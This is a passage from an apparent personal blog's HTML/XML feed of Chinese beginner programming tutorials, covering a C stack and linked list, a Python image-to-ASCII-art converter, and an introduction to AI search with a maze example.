Ctrl+Z to quit.\n&quot;</span>);</span><br><span class="line">status = <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;first_input);</span><br><span class="line"><span class="keyword">while</span>(status!=EOF)&#123;</span><br><span class="line">push(top, first_input);</span><br><span class="line">status = <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;first_input);</span><br><span class="line">&#125;</span><br><span class="line">display(top);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now enter 1 to pop data, 0 to quit.\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;pop_input);</span><br><span class="line"><span class="keyword">while</span>(pop_input==<span class="number">1</span>)&#123;</span><br><span class="line">pop_data = pop(top);</span><br><span class="line"><span class="keyword">if</span>(pop_data==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pop_data: %d\n&quot;</span>,pop_data);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;pop_input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nDone\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> 知识输出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用C语言实现链表</title>
      <link href="2021/05/02/link_list_by_C/"/>
      <url>2021/05/02/link_list_by_C/</url>
      
        <content type="html"><![CDATA[<h2>第一步：定义相应结构</h2><p>由于实现链表的编程语言为C，不能够使用类，故使用结构来实现链表中的节点；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkList</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> name[MAX_INPUT];</span><br><span class="line"><span class="keyword">long</span> number;</span><br><span class="line">LinkList* next;</span><br><span class="line">&#125;Link;</span><br></pre></td></tr></table></figure><p>该结构由一个字符数组，一项编号和一个指向此结构的指针组成。</p><h2>第二步：定义输入函数</h2><p>为了更容易、更准确的获取输入，在程序中重新定义输入函数，在原有fgets()函数的基础上略作修改，得到新的输入函数s_gets()；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">s_gets</span><span class="params">(<span class="keyword">char</span>* st, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span>* ret_val;</span><br><span class="line"><span class="keyword">char</span>* find;</span><br><span class="line">ret_val = fgets(st, n, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">if</span> (ret_val) &#123;</span><br><span class="line">find = <span class="built_in">strchr</span>(st, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (find) &#123;</span><br><span class="line">*find = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret_val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数为返回类型为字符指针、接受参数为一个字符指针和一个整数的输入函数，其中字符指针就是字符数组名称，因为数组名称本质上就是数组首元素的地址，而该数组为字符数组，故该字符数组名称本质上就是字符指针；</p><p>在函数内部，我声明了两个字符指针，一个用来接受<a href="https://baike.baidu.com/item/fgets">fgets</a>函数的返回值，一个用来接受查找字符函数(<a href="https://baike.baidu.com/item/strchr">strchr</a>)的返回值；</p><p>关于fgets()函数：</p><ul>    <li>如果接受输入的字符数量超过字符数组的大小(MAX_INPUT)，fgets()函数会返回先前传入的地址，即字符数组的名称，并且把末尾的字符换为空字符('\0')，使之成为一个字符串；</li>    <li>如果接收输入的字符数量在字符数组的大小以内，那么fgets()函数会将空字符放置在换行符之前，然后同样返回先前传入的地址；</li>    <li>需要注意的是：fgets()函数在遇到文件结尾(EOF End Of File)时将会返回一个空指针；</li></ul><p>关于strchr()函数：</p><ul>    <li>在某个字符数组中查找某字符，并返回指向该字符的指针</li>    <li>r如果字符串中不包含该字符，则返回一个空指针</li></ul><p>经过重写，修改如下：</p><p>首先使用fgets()函数接收输入，并将返回值存储在指针ret_val中，然后对该指针进行判断，如果不为空指针，则使用字符查找函数查找换行符，并将该换行符替换为空字符，如果查找换行符失败，说明输入的字符数量超过了字符数组的大小，这时使用一个while循环接收其余的输入并抛弃；如果ret_val为空指针，说明遇到文件结尾；最后返回ret_val；</p><h2>第三步：编写主函数进行测试</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> input[MAX_INPUT];</span><br><span class="line">Link* p = (Link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Link*));</span><br><span class="line">Link* temp = p;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now start recording: \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name  : &quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (s_gets(input,MAX_INPUT) != <span class="literal">NULL</span> &amp;&amp; input[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">Link* a = (Link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Link));</span><br><span class="line">a-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">temp-&gt;next = a;</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line"><span class="built_in">strcpy</span>(a-&gt;name, input);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Number: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;(a-&gt;number));</span><br><span class="line">getchar();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name  : &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">temp = p-&gt;next;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Recorded Data: \n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (temp) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name: %s\tNumber: %ld\n&quot;</span>, temp-&gt;name, temp-&gt;number);</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul>    <li>首先声明一个字符数组用来储存输入，然后声明一个节点类型的指针作为头节点，并为其分配内存，接着再声明一个同样的临时指针指向该头指针，这里使用临时指针的目的是作为当前指针与下一个指针的过渡指针，同时保持头指针指向的内容不变，方便最后的输出；</li>    <li>在输出提示信息之后进入循环，退出条件为输入空行；在循环中，首先声明指向当前节点的指针并为其分配内存，接着将该指针指向的结构中的指针声明为NULL，然后将当前节点的指针赋给临时指针指向的结构的指针，使其与上一个节点相连，然后再将临时指针指向的指针赋给自身(其实就相当于使临时指针指向下一个节点)；接着将刚刚接收的输入复制到当前节点的name变量中，然后再接收编号的输入并存储到当前节点的number变量中；值得注意的是，在使用scanf()函数接收输入后该函数似乎会将换行符留在缓存区中，所以这里需要使用getchar()函数来将该换行符从缓存区中去除；</li>    <li>在循环结束之后，我将临时指针指向了头节点的下一个节点(请注意，头节点中并没有储存除下一个节点的地址之外的任何信息，故此处从头节点的下一个节点开始)；然后进入下一个while循环，退出条件为临时指针为空指针(因为在上一个while循环中已经将当前节点中的指针声明为NULL了，所以一旦第一个循环结束，最后一个节点中的指针必为NULL)，然后打印出当前节点的信息并将临时指针指向下一个节点。</li></ul><h2>源代码</h2><p>最后附上源代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_INPUT 20</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">s_gets</span><span class="params">(<span class="keyword">char</span>* st, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">s_gets</span><span class="params">(<span class="keyword">char</span>* st, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span>* ret_val;</span><br><span class="line"><span class="keyword">char</span>* find;</span><br><span class="line">ret_val = fgets(st, n, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">if</span> (ret_val) &#123;</span><br><span class="line">find = <span class="built_in">strchr</span>(st, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (find) &#123;</span><br><span class="line">*find = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret_val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkList</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> name[MAX_INPUT];</span><br><span class="line"><span class="keyword">long</span> number;</span><br><span class="line">LinkList* next;</span><br><span class="line">&#125;Link;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> input[MAX_INPUT];</span><br><span class="line">Link* p = (Link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Link*));</span><br><span class="line">Link* temp = p;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now start recording: \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name  : &quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (s_gets(input,MAX_INPUT) != <span class="literal">NULL</span> &amp;&amp; input[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">Link* a = (Link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Link));</span><br><span class="line">a-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">temp-&gt;next = a;</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line"><span class="built_in">strcpy</span>(a-&gt;name, input);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Number: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;(a-&gt;number));</span><br><span class="line">getchar();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name  : &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">temp = p-&gt;next;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Recorded Data: \n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (temp) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name: %s\tNumber: %ld\n&quot;</span>, temp-&gt;name, temp-&gt;number);</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> 知识输出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用Python编写一个能将图片转换为字符画的程序</title>
      <link href="2021/04/10/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E8%83%BD%E5%B0%86%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%AD%97%E7%AC%A6%E7%94%BB%E7%9A%84%E7%A8%8B%E5%BA%8F/"/>
      <url>2021/04/10/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E8%83%BD%E5%B0%86%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%AD%97%E7%AC%A6%E7%94%BB%E7%9A%84%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">\<span class="comment"># -*- coding=utf-8 -*- </span></span><br><span class="line"></span><br><span class="line">from PIL import Image </span><br><span class="line"></span><br><span class="line">import argparse <span class="comment">#命令行输入参数处理 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser() </span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;file&#x27;</span>)     <span class="comment">#输入文件</span></span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>)   <span class="comment">#输出文件 </span></span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;--width&#x27;</span>, <span class="built_in">type</span> = int, default = 80) <span class="comment">#输出字符画宽 </span></span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;--height&#x27;</span>, <span class="built_in">type</span> = int, default = 80) <span class="comment">#输出字符画高 #获取参数 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">args = parser.parse_args() </span><br><span class="line"></span><br><span class="line">IMG = args.file</span><br><span class="line"></span><br><span class="line">WIDTH = args.width </span><br><span class="line"></span><br><span class="line">HEIGHT = args.height </span><br><span class="line"></span><br><span class="line">OUTPUT = args.output </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ascii_char = list(<span class="string">&quot;<span class="variable">$@B</span>%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\|()1&#123;&#125;[]?-_+~&lt;&gt;i!lI;:,\&quot;^&#x27;. &quot;</span>) <span class="comment"># 将256灰度映射到70个字符上 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_char(r,g,b,alpha = 256):    </span><br><span class="line"></span><br><span class="line">​<span class="keyword">if</span> alpha == 0:        </span><br><span class="line"></span><br><span class="line">​<span class="built_in">return</span> <span class="string">&#x27; &#x27;</span>    </span><br><span class="line"></span><br><span class="line">​length = len(ascii_char)    </span><br><span class="line"></span><br><span class="line">​gray = int(0.2126 * r + 0.7152 * g + 0.0722 * b)     </span><br><span class="line"></span><br><span class="line">​unit = (256.0 + 1)/length    </span><br><span class="line"></span><br><span class="line">​<span class="built_in">return</span> ascii_char[int(gray/unit)] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:     </span><br><span class="line"></span><br><span class="line">​im = Image.open(IMG)    </span><br><span class="line"></span><br><span class="line">​im = im.resize((WIDTH,HEIGHT), Image.NEAREST)     </span><br><span class="line"></span><br><span class="line">​txt = <span class="string">&quot;&quot;</span>     </span><br><span class="line"></span><br><span class="line">​<span class="keyword">for</span> i <span class="keyword">in</span> range(HEIGHT):        </span><br><span class="line"></span><br><span class="line">​<span class="keyword">for</span> j <span class="keyword">in</span> range(WIDTH):            </span><br><span class="line"></span><br><span class="line">​txt += get_char(*im.getpixel((j,i)))        </span><br><span class="line"></span><br><span class="line">​txt += <span class="string">&#x27;\n&#x27;</span>     </span><br><span class="line"></span><br><span class="line">​<span class="built_in">print</span>(txt)     <span class="comment">#字符画输出到文件    </span></span><br><span class="line"></span><br><span class="line">​<span class="keyword">if</span> OUTPUT:        </span><br><span class="line"></span><br><span class="line">​with open(OUTPUT,<span class="string">&#x27;w&#x27;</span>) as f:            </span><br><span class="line"></span><br><span class="line">​f.write(txt)    </span><br><span class="line"></span><br><span class="line">​<span class="keyword">else</span>:        </span><br><span class="line"></span><br><span class="line">​with open(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>) as f:           </span><br><span class="line"></span><br><span class="line">​f.write(txt)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人工智能入门-查找</title>
      <link href="2021/04/10/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%85%A5%E9%97%A8-%E6%90%9C%E7%B4%A2/"/>
      <url>2021/04/10/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%85%A5%E9%97%A8-%E6%90%9C%E7%B4%A2/</url>
      
        <content type="html"><![CDATA[<h2>概述</h2><p>众所周知，人工智能在近些年十分火爆，在各个领域的应用也是十分广泛，其中一个领域就是导航。<a id="more"></a></p><p>也许有人会说，导航不就是电子地图嘛？和人工智能有什么关系？但其实在导航中人工智能发挥了很重要的作用。“条条大路通罗马”，为什么导航会向你推荐这条路而不推荐另一条路？这其中就涉及到了人工智能中的搜索算法。</p><p><img src="https://www.helloimg.com/images/2021/04/05/B7S4Ln.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/04/05/B7S4Ln.png" srcset="data:image/png;base64,666" alt="B7S4Ln.png"></p><p>在搜索中，往往有初始状态(initial states)、目标状态(goal states)，而人工智能所做的，就是在众多情形中，找到众多解决方法的最优解，其中会涉及到循环和迭代，假如我们现在有一个初始状态，我们要怎样达到目标状态呢？</p><h2>概念介绍</h2><p>在这之前需要先了解一些概念：</p><ul>    <li>动作：通常是接受状态的函数，返回在此状态中应该做出的决策</li>    <li>迁移模型：通常是接受状态和动作的函数，返回在此状态下做出此种决策后的新状态</li>    <li>节点：数据结构，用来记录状态，父节点，动作和路径成本</li>    <li>边界：数据结构，用来区分已探索的部分和未探索的部分</li></ul><h2>算法讨论</h2><p>在了解了相关概念之后，我们开始讨论算法：</p><ul>    <li>首先将初始状态放入边界，然后进入循环</li>    <ul>        <li>如果边界为空，则无解</li>        <li>从边界中移去一个节点</li>        <li>如果此节点包含目标状态，则追踪父节点，然后返回解决方案</li>        <li>扩张节点并将其加入边界</li>    </ul></ul><p>下面举个例子：</p><img src="https://www.helloimg.com/images/2021/04/05/B7StR6.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/04/05/B7StR6.png" srcset="data:image/png;base64,666" alt="B7StR6.png" style="zoom: 33%;" /><p>假设我们现在的要求是找到从A到E的路径</p><ul>    <li>第一步我们将A（初始状态）放入边界，进入循环</li>    <li>因为A不是目标状态，将A移出边界并将B加入边界</li>    <li>因为B不是目标状态，将B移出边界并将C和D加入边界</li>    <li>因为C不是目标状态，将C移出边界并将E加入边界</li>    <li>因为E是目标状态，所以我们返回从A到E的路径，循环结束</li></ul>至此，我们就解决了一个非常简单的路径搜索问题，当然，这个算法还存在着许多问题，比如：如何确保算法不会重新检查当前状态的父节点？如果重复检查父节点，那么程序将进入无限死循环。解决方法很简单，使用一个数据结构来储存已检查过的节点，然后在每次检查节点时遍历此数据结构，如果存在与之相同的节点则不检查。<p>那么在实际情况下是怎么样的呢？</p><h2>实战</h2><p>下面进入实战环节：</p><p>情境：你现在有一张迷宫地图，起点为A，终点为B，需要编写程序令计算机自行找出离开迷宫的路并显示在屏幕上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># # # # #         B </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">A           <span class="comment"># # # # </span></span><br></pre></td></tr></table></figure><p>我们将这个待实现的程序按照之前所讨论的分为几个部分：</p><p><a href="https://www.helloimg.com/image/BITMNm"><img src="https://www.helloimg.com/images/2021/04/11/BITMNm.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/04/11/BITMNm.png" srcset="data:image/png;base64,666" alt="BITMNm.png"></a></p><p>如图所示，我们主要将程序分为三个部分：</p><p>首先是定义相关的变量，并且将初始状态放入边界；</p><p>然后进入循环：</p><ul>    <li>第一步：检查边界的长度，如果等于0则说明无解</li>    <li>第二步：从边界中移去一个节点，并将此节点添加到表示已探索的数据结构</li>    <li>第三步：检查被移去的节点，如果此节点包含目标状态，则追踪其父节点，并返回路径</li></ul><p>最后，我们使用一个循环来追踪完整的路径，并将其显示在屏幕上。</p><p>以下是根据思路实现的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">map1  = [[<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span 